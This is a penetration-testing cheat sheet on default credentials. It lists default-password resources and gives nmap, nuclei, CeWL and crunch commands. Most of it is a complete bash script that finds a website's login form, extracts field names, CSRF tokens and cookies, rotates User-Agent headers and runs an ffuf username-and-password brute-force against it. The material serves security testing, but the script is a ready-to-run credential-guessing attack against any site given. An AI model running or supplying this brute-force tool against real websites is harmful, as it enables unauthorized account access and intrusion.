# Default Credentials

## Check List

* [ ] Determine whether the application has any user accounts with default passwords.
* [ ] Review whether new user accounts are created with weak or predictable passwords.

## Cheat Sheet

### Vendor Default Credentials

#### Default Creds

{% embed url="https://github.com/many-passwords/many-passwords" %}

{% embed url="https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv" %}

{% embed url="https://many-passwords.github.io/" %}

{% embed url="https://crackstation.net/" %}

{% embed url="https://haveibeenpwned.com/Passwords" %}

{% embed url="https://cirt.net/passwords" %}

#### [Nmap](https://github.com/nnposter/nndefaccts)

```bash
sudo nmap -p80,443 --mtu 5000 --script http-default-accounts $WEBSITE
```

### Organization Default Passwords

{% embed url="https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials" %}

#### [defaultcreds-cheat-sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)

```bash
creds search tomcat
```

#### [Nuclei](https://github.com/projectdiscovery/nuclei-templates/tree/main/http/default-logins)

```bash
nuclei -u $WEBSITE -tags default-login
```

### Application Generated Default Passwords

#### [CeWL](https://github.com/digininja/CeWL)

```bash
cewl $WEBSITE -w /tmp/words.txt
```

#### [Crunch](https://sourceforge.net/projects/crunch-wordlist/)

```bash
crunch 8 12 -t @@company%% -o /tmp/passlist.txt
```

{% hint style="info" %}
`-t` = Password Pattern

`@` = Lowercase Keywords

`,` = Uppercase Keywords

`%` = Digits

`^` = Meta Characters

Example Result: `abcompany12`
{% endhint %}

#### [FFUF](https://github.com/ffuf/ffuf)

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano default-bruteforce.sh
```

```bash
#!/bin/bash

# CONFIG
USERLIST="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
PASSLIST="/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
UA_LIST="/usr/share/seclists/Fuzzing/User-Agents/user-agents-whatismybrowserdotcom-mid.txt"

# INPUT CHECK
if [ $# -lt 1 ]; then
    echo "Usage: $0 <domain.com>"
    exit 1
fi

URL="$1"

# FIND LOGIN PAGE
LOGIN=$(katana -u "$URL" -depth 3 -silent | \
grep -iE "/(login|signin|sign-in|auth|user/login|admin/login|my-account|account|wp-login\.php)(/)?$" | \
grep -viE "lost-password|reset|forgot|register|signup|signout|logout|\.(js|css|jpg|png|gif|svg|ico)$" | \
sed 's:[/?]*$::' | sort -u | head -n1)

if [ -z "$LOGIN" ]; then
    echo "[!] No login page found. Exiting."
    exit 1
fi

# FETCH HTML
HTML=$(curl -s "$LOGIN")
FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 100)

# CAPTCHA / reCAPTCHA check
CAPTCHA_KEYWORDS="g-recaptcha|recaptcha|h-captcha|data-sitekey|captcha|grecaptcha.execute|hcaptcha.execute"
if echo "$HTML" | grep -qiE "$CAPTCHA_KEYWORDS"; then
    echo "[!] CAPTCHA detected on login page. Brute-force aborted."
    exit 1
fi

# EXTRACT FORM ACTION AND METHOD
ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
[ -z "$ACTION" ] && ACTION="$LOGIN"

METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
[ -z "$METHOD" ] && METHOD="post"

if [[ "$ACTION" == /* ]]; then
    BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
elif [[ "$ACTION" =~ ^https?:// ]]; then
    FULL_ACTION="$ACTION"
else
    BASE_URL=$(echo "$LOGIN" | sed 's|\(https\?://.*/\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
fi

# EXTRACT USERNAME & PASSWORD FIELDS
USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
grep -Ei 'user(name)?|login(_id)?|userid|uname|mail|email|auth_user' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
grep -Ei 'pass(word)?|passwd|pwd|auth_pass|login_pass' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')

[ -z "$USERNAME_FIELD" ] && USERNAME_FIELD="username"
[ -z "$PASSWORD_FIELD" ] && PASSWORD_FIELD="password"

# CSRF TOKEN EXTRACTION
CSRF_FIELD=""
CSRF_VALUE=""

HIDDEN_INPUTS=$(echo "$FORM" | grep -oiP '<input[^>]+type=["'\'']?hidden["'\'']?[^>]*>')
while read -r INPUT; do
    NAME=$(echo "$INPUT" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+')
    VALUE=$(echo "$INPUT" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+')
    if [[ "$NAME" =~ csrf|token|nonce|authenticity|verification ]]; then
        CSRF_FIELD="$NAME"
        CSRF_VALUE="$VALUE"
        break
    fi
done <<< "$HIDDEN_INPUTS"

if [ -z "$CSRF_FIELD" ] && [ -n "$HIDDEN_INPUTS" ]; then
    CSRF_FIELD=$(echo "$HIDDEN_INPUTS" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+' | head -1)
    CSRF_VALUE=$(echo "$HIDDEN_INPUTS" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+' | head -1)
fi

# PREPARE POST DATA
DATA="${USERNAME_FIELD}=FUZZ1&${PASSWORD_FIELD}=FUZZ2"
[ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"

# EXTRACT COOKIES
COOKIES=$(curl -s -I "$LOGIN" | grep -i '^Set-Cookie:' | sed -E 's/^Set-Cookie: //I' | tr -d '\r\n')

# HEADERS
HEADERS=(
  -H "Content-Type: application/x-www-form-urlencoded"
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0"
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
  -H "Accept-Language: en-US,en;q=0.5"
  -H "Accept-Encoding: gzip, deflate"
  -H "Connection: keep-alive"
  -H "Upgrade-Insecure-Requests: 1"
  -H "Referer: $LOGIN"
)
[ -n "$COOKIES" ] && HEADERS+=(-H "Cookie: $COOKIES")

# RUN FFUF
if [[ "$METHOD" == "get" ]]; then
    FFUF_URL="${FULL_ACTION}?${DATA}"
    ffuf -u "$FFUF_URL" \
         -w "$USERLIST:FUZZ1" \
         -w "$PASSLIST:FUZZ2" \
         -w "$UA_LIST:UA" \
         -X GET \
         -ac -c -r \
         -mc 200,301,302 \
         -H "User-Agent: UA" \
         "${HEADERS[@]}"
else
    ffuf -u "$FULL_ACTION" \
         -w "$USERLIST:FUZZ1" \
         -w "$PASSLIST:FUZZ2" \
         -w "$UA_LIST:UA" \
         -X POST \
         -d "$DATA" \
         -ac -c -r \
         -mc 200,301,302 \
         -H "User-Agent: UA" \
         "${HEADERS[@]}"
fi
```

{% hint style="info" %}
Run Script
{% endhint %}

```bash
sudo chmod +x default-bruteforce.sh;sudo ./default-bruteforce.sh $WEBSITE
```
